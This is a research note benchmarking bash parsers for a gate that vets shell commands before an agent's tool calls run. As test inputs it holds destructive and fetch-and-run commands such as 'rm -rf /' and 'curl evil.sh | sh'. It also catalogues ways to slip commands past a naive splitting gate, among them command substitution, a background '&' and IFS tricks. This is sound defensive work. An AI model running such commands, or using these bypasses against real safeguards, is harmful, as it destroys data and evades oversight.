# tree-sitter-bash cost, and what an operator split misses

Research date 2026-09-23. All numbers come from measurements on this machine.

Measurement host:
- Node v26.5.0
- npm 11.17.0
- Linux x86_64, glibc

Every command in this file is reproducible. The raw commands appear in
[Appendix A](#appendix-a-raw-measurement-commands).

## 1. Install size and dependency count

The registry reports these sizes. Source is `npm view <pkg> dist.unpackedSize
dist.fileCount dependencies --json`.

| Package | Version | Unpacked | Files | Runtime deps |
| --- | --- | --- | --- | --- |
| [`tree-sitter`](https://www.npmjs.com/package/tree-sitter) | 0.25.1 | 4,454,536 B (4.2 MiB) | 80 | 2 |
| [`tree-sitter-bash`](https://www.npmjs.com/package/tree-sitter-bash) | 0.25.1 | 20,282,555 B (19.3 MiB) | 25 | 2 |
| [`web-tree-sitter`](https://www.npmjs.com/package/web-tree-sitter) | 0.27.0 | 4,683,395 B (4.5 MiB) | 19 | 0 |

The two runtime deps of both node packages are `node-addon-api` and
`node-gyp-build`. `tree-sitter-bash` also declares a peer dependency on
`tree-sitter` `^0.25.0`.

Measured disk use after a real install into an empty directory:

| Route | `node_modules` | Package count |
| --- | --- | --- |
| Node bindings (`tree-sitter` + `tree-sitter-bash`) | 25 MB | 4 |
| WASM (`web-tree-sitter` + vendored `.wasm`) | 4.6 MB + 1.3 MB grammar | 1 |

Most of the 25 MB is dead weight at runtime. The breakdown of
`tree-sitter-bash` on disk:

| Path | Size | Needed at runtime |
| --- | --- | --- |
| `src/` (`parser.c` is 9.9 MB) | 9.8 MB | no |
| `prebuilds/` (6 platform tuples) | 8.3 MB | one tuple only |
| `tree-sitter-bash.wasm` | 1.3 MB | only on the WASM route |
| `grammar.js`, bindings, metadata | 60 KB | no |

A pruned install keeps one platform and drops `src/`. That install measures
**3.7 MB** and still parses correctly.

## 2. Does the install compile native code

The install script of both node packages is `node-gyp-build`. See
`node_modules/tree-sitter/package.json`, key `scripts.install`.

On a supported platform no compile happens. `node-gyp-build` finds a
prebuilt `.node` file and exits. The install of both packages finished in
**1.2 s** on this host. No `build/` directory appeared.

`tree-sitter-bash` ships prebuilds for six tuples:
- `darwin-arm64`
- `darwin-x64`
- `linux-arm64`
- `linux-x64`
- `win32-arm64`
- `win32-x64`

`tree-sitter` ships the same six tuples.

Three facts limit that guarantee.

First, the fallback does compile. `node_modules/node-gyp-build/bin.js` runs
`node-gyp-build-test`. On failure it calls `build()`, which spawns
`node-gyp rebuild`. An unlisted platform therefore needs a C++ toolchain.

Second, the Linux prebuilds link glibc. `ldd` on
`prebuilds/linux-x64/tree-sitter.node` reports `libc.so.6`, `libstdc++.so.6`
and `libgcc_s.so.1`. No musl prebuild exists. Alpine hosts fall back to the
compile path.

Third, the prebuild files carry no libc tag, so `node-gyp-build` treats them
as universal for the platform. The mismatch only appears at load time on musl.

`npm install --ignore-scripts` works. The runtime resolver in
`node_modules/node-gyp-build/index.js` locates the prebuild during `require`.
A verified test installed both packages with `--ignore-scripts` and parsed
`ls -la` without error. A pi extension that forbids install scripts can still
use the node bindings.

The WASM route runs no build step at all. `web-tree-sitter` declares no
`install` script and no dependencies. The grammar is a plain `.wasm` file.
`tree-sitter-bash` already ships `tree-sitter-bash.wasm` at 1,358,224 bytes,
so the file can be vendored into the extension.

## 3. Measured parser load time

The harness uses `process.hrtime.bigint()` around each step. Node is v26.5.0.
Three runs per route.

### Node bindings

| Step | Run 1 | Run 2 | Run 3 |
| --- | --- | --- | --- |
| `require('tree-sitter')` | 1.819 ms | 1.671 ms | 1.577 ms |
| `require('tree-sitter-bash')` | 0.792 ms | 0.738 ms | 0.700 ms |
| `new Parser()` | 0.020 ms | 0.014 ms | 0.013 ms |
| `setLanguage()` | 0.973 ms | 0.866 ms | 0.855 ms |
| **Total cold start** | **3.603 ms** | **3.289 ms** | **3.145 ms** |
| First `parse()` | 0.132 ms | 0.106 ms | 0.102 ms |
| RSS after load | 47.5 MB | 46.7 MB | 47.0 MB |

Steady-state parse cost is **10.0 us** for a 50 character command line. That
is the mean over 1000 iterations.

The pruned single-platform install loads in 4.712 ms. Its `setLanguage()` drops
to 0.175 ms because fewer prebuild directories need a scan.

### WASM route

| Step | Run 1 | Run 2 | Run 3 |
| --- | --- | --- | --- |
| `require('web-tree-sitter')` | 2.211 ms | 2.040 ms | 2.043 ms |
| `Parser.init()` | 2.848 ms | 2.518 ms | 2.547 ms |
| `Language.load(wasm)` | 7.007 ms | 6.688 ms | 6.427 ms |
| `new Parser()` + `setLanguage()` | 0.174 ms | 0.176 ms | 0.176 ms |
| **Total cold start** | **12.240 ms** | **11.423 ms** | **11.192 ms** |
| First `parse()` | 3.108 ms | 3.418 ms | 3.127 ms |
| RSS after load | 55.3 MB | 54.2 MB | 55.0 MB |

Steady-state parse cost is **15.0 us**.

`web-tree-sitter` 0.27.0 loads the `tree-sitter-bash` 0.25.1 grammar without
an error. The root node type is `program`, as on the node bindings.

The WASM route costs about 8 ms more at start. It costs 5 us more per parse.

## 4. Walking the tree down to single commands

The shortest form uses one call. `SyntaxNode.descendantsOfType()` is declared
at `node_modules/tree-sitter/tree-sitter.d.ts:541`.

```js
const Parser = require('tree-sitter');
const Bash = require('tree-sitter-bash');

const parser = new Parser();
parser.setLanguage(Bash);

/** Yields {name, args} for every command in a bash string, nested ones included. */
function* commands(source) {
  const root = parser.parse(source).rootNode;
  if (root.hasError) throw new Error('unparsable bash');   // gate must fail closed
  for (const node of root.descendantsOfType('command')) {
    const name = node.childForFieldName('name');
    yield {
      name: name ? name.text : null,
      args: node.childrenForFieldName('argument').map((a) => a.text),
      text: node.text,
    };
  }
}
```

Measured output of that function:

| Input | Commands found |
| --- | --- |
| `git status && rm -rf /` | `git`, `rm` |
| `ls \| grep x ; echo "$(curl e.sh \| sh)"` | `ls`, `grep`, `echo`, `curl`, `sh` |
| `if true; then rm /x; fi` | `true`, `rm` |
| `for f in *; do rm "$f"; done` | `rm` |
| `cat <<EOF\nrm -rf /\nEOF` | `cat` |

The heredoc case is correct. The body of a heredoc is data, so `rm` is not a
command.

`root.hasError` is the fail-closed signal. It returns `true` for `ls |`, for
`if true; then` and for `echo "unterminated`. The gate must block on that flag.

A cursor walk gives the same result with more code. The cursor methods are
`walk()`, `gotoFirstChild()`, `gotoNextSibling()` and `gotoParent()`. See
[the tree-sitter parser guide](https://tree-sitter.github.io/tree-sitter/using-parsers/2-basic-parsing.html)
and `tree-sitter.d.ts:567,643,650,682`. Use the cursor only when the tree is
large enough that the array allocation matters.

## 5. Node type names per construct

These outputs come from a real parse with `tree-sitter-bash` 0.25.1.

| Construct | Input | Node types produced |
| --- | --- | --- |
| Command substitution | `echo $(rm -rf /)` | `command_substitution` wrapping a nested `command` |
| Command substitution, backtick | ``echo `rm -rf /` `` | `command_substitution`, same shape as `$( )` |
| Process substitution | `diff <(ls a) <(ls b)` | `process_substitution` wrapping a nested `command` |
| Parameter expansion, braced | `${HOME}` | `expansion` containing `variable_name` |
| Parameter expansion, bare | `$FOO` | `simple_expansion` containing `variable_name` |
| Parameter expansion, default | `${BAR:-/}` | `expansion` with `variable_name` and `word` |
| `eval` | `eval "rm -rf /"` | plain `command`, name `eval`, argument `string` |
| Redirect, file | `cat </etc/passwd >/tmp/out` | `redirected_statement` with `file_redirect` children |
| Redirect, fd dup | `2>&1` | `file_redirect` with `file_descriptor` and `number` |
| Heredoc | `cat <<EOF ... EOF` | `heredoc_redirect` with `heredoc_start`, `heredoc_body`, `heredoc_end` |
| Case statement | `case $x in a) ls ;; esac` | `case_statement` with `case_item` children |
| Arithmetic | `echo $((1+2))` | `arithmetic_expansion` with `binary_expression` |

Full s-expression for the redirect case:

```
(program (redirected_statement
  body: (command name: (command_name (word)))
  redirect: (file_redirect destination: (word))
  redirect: (file_redirect destination: (word))
  redirect: (file_redirect descriptor: (file_descriptor) destination: (number))))
```

Two gaps need a note.

The parser does not look inside an `eval` string. `eval "rm -rf /"` yields one
`command` named `eval` with a `string` argument. No `rm` node exists. The gate
must treat `eval` as a deny-by-default name.

The parser does not resolve variable indirection. `IFS=X; cmd=lsXal; $cmd`
yields a `command` whose name is a `simple_expansion`. No static parser can
know the value. The gate must deny a command whose name is not a literal word.

## 6. What a naive operator split gets wrong

The naive splitter under test is one line:

```js
const naive = (s) => s.split(/;|&&|\|\||\||\n/).map((x) => x.trim()).filter(Boolean);
```

Every "what runs" column below comes from a `bash -x` trace. `PAYLOAD` stands
for a dangerous command.

| # | Input | Naive split produces | What bash really runs |
| --- | --- | --- | --- |
| 1 | `echo "a ; PAYLOAD"` | `['echo "a', 'PAYLOAD"']` | `echo 'a ; PAYLOAD'` only |
| 2 | `echo a\;b` | `['echo a\\', 'b']` | `echo 'a;b'` only |
| 3 | `cat <<EOF\nPAYLOAD\nEOF` | `['cat <<EOF', 'PAYLOAD', 'EOF']` | `cat` only |
| 4 | `(cd /tmp && PAYLOAD)` | `['(cd /tmp', 'PAYLOAD)']` | `cd /tmp` then `PAYLOAD` |
| 5 | `echo $(PAYLOAD)` | `['echo $(PAYLOAD)']` | `PAYLOAD` first, then `echo` |
| 6 | `IFS=";"; cmd="echo;PAYLOAD"; $cmd` | `['IFS="', '"', 'cmd="echo', 'PAYLOAD"', '$cmd']` | `echo PAYLOAD` |
| 7 | `echo ok # ; PAYLOAD` | `['echo ok #', 'PAYLOAD']` | `echo ok` only |
| 8 | `echo \\\n-n PAYLOAD` | `['echo \\', '-n PAYLOAD']` | `echo -n PAYLOAD`, one command |
| 9 | `case $x in a) echo A ;; *) PAYLOAD ;; esac` | `['case $x in a) echo A', '*) PAYLOAD', 'esac']` | `PAYLOAD` when `$x` is not `a` |
| 10 | `PAYLOAD & echo second` | `['PAYLOAD & echo second']` | two commands, `&` is a separator |
| 11 | `echo "a\|\|b"` | `['echo "a', 'b"']` | `echo 'a||b'` only |

The failures split into two classes.

**False alarms** are rows 1, 2, 3, 7, 8 and 11. The splitter invents a command
that never runs. A gate that blocks on these stops safe work. The user then
turns the gate off.

**Misses** are rows 4, 5, 6, 9 and 10. The splitter hides a command that does
run.

Row 5 is the worst. The chunk `echo $(PAYLOAD)` matches an `echo *` allow rule
as a whole string. The payload runs before `echo` ever starts.

Row 10 is the second worst. `&` is not in the split set at all. Any command
after a background `&` never reaches the matcher.

Row 6 defeats every static text parser, including tree-sitter. Word splitting
on `$IFS` builds the command at runtime. The only safe rule is to deny a
command whose name is an expansion.

Row 9 shows the `;;` problem. A split on `;` produces two empty chunks per case
arm, and the arm pattern `*)` merges into the command text.

## 7. Pure-JavaScript alternatives

All four packages were installed and run against the same eight inputs.

### shell-quote

| Field | Value |
| --- | --- |
| Version | [1.10.0](https://www.npmjs.com/package/shell-quote), published 2026-07-10 |
| Unpacked | 43,258 B, 21 files |
| Dependencies | 0 |
| `require` time | 0.702 ms |
| Repo | [ljharb/shell-quote](https://github.com/ljharb/shell-quote), 7 open issues, last push 2026-07-15 |

`shell-quote` is a tokenizer. `parse()` returns a flat array of words and
operator objects. It handles quoting and escaping correctly. Measured output
for `echo "a ; rm -rf /"` is `["echo","a ; rm -rf /"]`.

It does not build a tree. `echo $(rm -rf /)` returns
`["echo","$",{"op":"("},"rm","-rf","/",{"op":")"}]`. The nesting is lost.
`cat <<EOF\nrm -rf /\nEOF` returns the heredoc body as ordinary words. A gate
built on this output cannot tell data from a command.

Verdict. Useful for quoting only. Not enough for a command gate.

### bash-parser

| Field | Value |
| --- | --- |
| Version | [0.5.0](https://www.npmjs.com/package/bash-parser), published **2017-06-22** |
| Installed size | 340 KB, plus 30 transitive packages |
| Dependencies | 21 direct |
| `require` time | 11.959 ms |
| Repo | [vorpaljs/bash-parser](https://github.com/vorpaljs/bash-parser), 24 open issues, last push 2024-06-23 |

The package has no npm release in over nine years. It pulls in `babylon@6`,
which is the pre-Babel-7 parser.

It does produce a real AST. Command substitution nests correctly, with a
`CommandExpansion` node that holds a full `commandAST`.

It gets heredocs wrong. For `cat <<EOF\nrm -rf /\nEOF` it returns three
top-level `Command` nodes. The delimiter word `EOF` disappears from the `cat`
suffix, and the heredoc body parses as a live `rm -rf /` command. That is a
false alarm on every heredoc.

It throws on bash-only syntax. `ls |& grep x` raises
`Parse error on line 1: Unexpected 'SEPARATOR_OP'`. `coproc foo { ls; }` raises
`Parse error on line 1: Unexpected 'Rbrace'`. The grammar targets POSIX sh, not
bash.

Verdict. Unmaintained, and wrong on heredocs. Do not use.

### mvdan-sh

| Field | Value |
| --- | --- |
| Version | [0.10.1](https://www.npmjs.com/package/mvdan-sh), published 2022-05-08 |
| Unpacked | 1,509,909 B, 4 files |
| Dependencies | 0 |
| `require` time | 28.677 ms |
| Upstream repo | [mvdan/sh](https://github.com/mvdan/sh), 93 open issues, last push 2026-09-22 |

npm marks the package **deprecated**. The notice points at
[mvdan/sh issue 1145](https://github.com/mvdan/sh/issues/1145), closed
2025-04-07. The maintainer states the package is very outdated and names
`sh-syntax` as the replacement.

The parser is correct on every case tested. It matches tree-sitter on all
eight inputs. Measured results:

| Input | Commands found |
| --- | --- |
| `git status && rm -rf /` | `git status`, `rm -rf /` |
| `echo "a ; rm -rf /"` | `echo` only |
| `echo $(rm -rf /)` | `echo`, `rm -rf /` |
| `cat <<EOF\nrm -rf /\nEOF` | `cat` only |
| `case $x in a) ls ;; *) rm -rf / ;; esac` | `ls`, `rm -rf /` |
| `eval "rm -rf /"` | `eval` only |
| `ls >out 2>&1` | `ls` only |
| `for f in *; do rm "$f"; done` | `rm` |

The cost is the load time. 28.7 ms for `require` is nine times the node
bindings. The bundle is GopherJS output, so the whole Go runtime initialises.

Verdict. Correct but deprecated and slow to load.

### sh-syntax

| Field | Value |
| --- | --- |
| Version | [0.6.0](https://www.npmjs.com/package/sh-syntax), published 2026-07-08 |
| Unpacked | 793,650 B, 23 files |
| Repo | [un-ts/sh-syntax](https://github.com/un-ts/sh-syntax), 10 open issues, last push 2026-09-11 |

This is the maintained successor named in issue 1145. It wraps the same
`mvdan/sh` grammar as a WASM module instead of a GopherJS bundle. It was not
benchmarked here, because the node bindings already satisfy the requirement.
Treat it as the fallback if the tree-sitter route fails.

## What this means for the gate

Pick `web-tree-sitter` plus a vendored `tree-sitter-bash.wasm`.

Three facts drive that choice.

The WASM route has no native code. It removes the whole platform matrix, the
glibc and musl split, and the `node-gyp` fallback. A pi extension ships to
machines whose toolchain is unknown.

The WASM route has one dependency and 5.9 MB on disk. The node route pulls four
packages and 25 MB, of which 9.9 MB is a C source file that never runs.

The 11 ms start cost is paid once when the extension loads. Per-call parse cost
is 15 us. A gate that runs on every tool call spends more time on the hook
dispatch.

Take the node bindings instead if the extension controls its install
environment. They load in 3.3 ms and parse in 10 us, and the API is identical.
The 25 MB prunes to 3.7 MB by deleting `src/` and five prebuild tuples.

Reject the operator split. Rows 4, 5, 6, 9 and 10 of the table in section 6 are
each a full bypass of the gate.

Reject `bash-parser`. It is nine years stale and mis-parses heredocs.

### Cost of being wrong

A miss lets a denied command run. The blast radius is whatever the command
does. `rm -rf /` and `curl evil.sh | sh` both hide inside a chunk that a naive
split hands to an allow rule.

A false alarm blocks safe work. The user reacts by disabling the gate. A
disabled gate misses everything.

Both directions therefore end in the same place. Under-blocking is faster to
get there.

Three rules follow from that.

1. Deny a command whose name node is not a literal `word`.
2. Deny `eval`, `source` and `.` by name, because their argument is not parsed.
3. Block when `rootNode.hasError` is true, and wrap the handler so a thrown
   error also blocks.

Rule 3 matters twice over. The pi host loop has no `try`/`catch` around the
handler, so a thrown handler lets the tool run.

---

## Appendix A. Raw measurement commands

Registry metadata:

```sh
npm view tree-sitter version dist.unpackedSize dist.fileCount dependencies --json
npm view tree-sitter-bash version dist.unpackedSize dist.fileCount dependencies peerDependencies scripts --json
npm view web-tree-sitter version dist.unpackedSize dist.fileCount dependencies scripts --json
npm view bash-parser  version dist.unpackedSize dependencies time --json
npm view shell-quote  version dist.unpackedSize dependencies time --json
npm view mvdan-sh     version dist.unpackedSize dependencies time --json
npm view sh-syntax    version dist.unpackedSize dist.fileCount --json
```

Install and size, node bindings:

```sh
mkdir native && cd native && npm init -y
time npm install --foreground-scripts tree-sitter tree-sitter-bash
du -sh node_modules
du -sh node_modules/*
du -sh node_modules/tree-sitter-bash/*
find node_modules -name '*.node'
ldd node_modules/tree-sitter/prebuilds/linux-x64/tree-sitter.node
```

Install without scripts:

```sh
mkdir noscripts && cd noscripts && npm init -y
npm install --ignore-scripts tree-sitter tree-sitter-bash
node -e 'const P=require("tree-sitter"),B=require("tree-sitter-bash");
         const p=new P();p.setLanguage(B);
         console.log(p.parse("ls -la").rootNode.toString())'
```

Pruned install:

```sh
cp -r native trimmed && cd trimmed
rm -rf node_modules/tree-sitter-bash/src node_modules/tree-sitter-bash/tree-sitter-bash.wasm
find node_modules -path '*prebuilds/*' -maxdepth 4 -type d \
     ! -name linux-x64 ! -name prebuilds -exec rm -rf {} +
du -sh node_modules
node bench.js
```

Load-time harness, node bindings. Save as `native/bench.js` and run three
times.

```js
const ns = () => process.hrtime.bigint();
const ms = (a, b) => Number(b - a) / 1e6;

const t0 = ns();  const Parser = require('tree-sitter');
const t1 = ns();  const Bash   = require('tree-sitter-bash');
const t2 = ns();  const p = new Parser();
const t3 = ns();  p.setLanguage(Bash);
const t4 = ns();  p.parse('git status && rm -rf /');
const t5 = ns();

console.log(JSON.stringify({
  node: process.version,
  require_tree_sitter_ms: +ms(t0, t1).toFixed(3),
  require_tree_sitter_bash_ms: +ms(t1, t2).toFixed(3),
  new_Parser_ms: +ms(t2, t3).toFixed(3),
  setLanguage_ms: +ms(t3, t4).toFixed(3),
  first_parse_ms: +ms(t4, t5).toFixed(3),
  total_cold_start_ms: +ms(t0, t4).toFixed(3),
  rss_mb: +(process.memoryUsage().rss / 1048576).toFixed(1),
}));

const src = 'git status && rm -rf / ; echo "$(whoami)" | grep x';
let acc = 0n;
for (let i = 0; i < 1000; i++) { const a = ns(); p.parse(src); acc += ns() - a; }
console.log({ mean_parse_us: +(Number(acc) / 1e6).toFixed(2) });
```

Load-time harness, WASM route. Save as `wasm/bench.js`.

```sh
mkdir wasm && cd wasm && npm init -y
npm install web-tree-sitter
cp ../native/node_modules/tree-sitter-bash/tree-sitter-bash.wasm .
```

```js
const path = require('path');
const ns = () => process.hrtime.bigint();
const ms = (a, b) => Number(b - a) / 1e6;

(async () => {
  const t0 = ns();  const { Parser, Language } = require('web-tree-sitter');
  const t1 = ns();  await Parser.init();
  const t2 = ns();  const Bash = await Language.load(path.join(__dirname, 'tree-sitter-bash.wasm'));
  const t3 = ns();  const p = new Parser(); p.setLanguage(Bash);
  const t4 = ns();  p.parse('git status && rm -rf /');
  const t5 = ns();
  console.log(JSON.stringify({
    node: process.version,
    require_web_tree_sitter_ms: +ms(t0, t1).toFixed(3),
    Parser_init_ms: +ms(t1, t2).toFixed(3),
    Language_load_ms: +ms(t2, t3).toFixed(3),
    new_Parser_setLanguage_ms: +ms(t3, t4).toFixed(3),
    first_parse_ms: +ms(t4, t5).toFixed(3),
    total_cold_start_ms: +ms(t0, t4).toFixed(3),
    rss_mb: +(process.memoryUsage().rss / 1048576).toFixed(1),
  }));
})();
```

Node type names. Parse each construct and print the s-expression.

```js
const Parser = require('tree-sitter');
const Bash = require('tree-sitter-bash');
const p = new Parser(); p.setLanguage(Bash);
for (const src of [
  'echo $(rm -rf /)', 'echo `rm -rf /`', 'diff <(ls a) <(ls b)',
  'rm -rf "${HOME}/x" $FOO ${BAR:-/}', 'eval "rm -rf /"',
  'cat </etc/passwd >/tmp/out 2>&1', 'cat <<EOF\nrm -rf /\nEOF',
  'case $x in\n a) echo a ;;\nesac', 'echo $((1+2))', 'IFS=X; cmd=lsXal; $cmd',
]) console.log(JSON.stringify(src), '\n ', p.parse(src).rootNode.toString(), '\n');
```

Naive split versus real bash. The first script prints the split, the second
prints the trace.

```js
const naive = (s) => s.split(/;|&&|\|\||\||\n/).map((x) => x.trim()).filter(Boolean);
console.log(naive('echo "a ; PAYLOAD"'));
```

```sh
bash -x -c 'echo "a ; PAYLOAD"'
bash -x -c 'echo a\;b'
bash -x -c $'cat <<EOF\nPAYLOAD\nEOF'
bash -x -c '(cd /tmp && echo PAYLOAD)'
bash -x -c 'echo $(echo PAYLOAD)'
bash -x -c 'IFS=";"; cmd="echo;PAYLOAD"; $cmd'
bash -x -c 'echo ok # ; PAYLOAD'
bash -x -c $'echo \\\n-n PAYLOAD'
bash -x -c $'x=b\ncase $x in\n a) echo A ;;\n *) echo PAYLOAD ;;\nesac'
bash -x -c 'echo PAYLOAD & echo second'
bash -x -c 'echo "a||b"'
```

Pure-JavaScript parsers:

```sh
mkdir pure && cd pure && npm init -y
npm install bash-parser shell-quote mvdan-sh
du -sh node_modules/bash-parser node_modules/shell-quote node_modules/mvdan-sh
npm ls --all
```

GitHub maintenance data:

```sh
curl -sS https://api.github.com/repos/tree-sitter/tree-sitter-bash
curl -sS https://api.github.com/repos/tree-sitter/node-tree-sitter
curl -sS https://api.github.com/repos/vorpaljs/bash-parser
curl -sS https://api.github.com/repos/ljharb/shell-quote
curl -sS https://api.github.com/repos/mvdan/sh
curl -sS https://api.github.com/repos/un-ts/sh-syntax
curl -sS https://api.github.com/repos/mvdan/sh/issues/1145
```
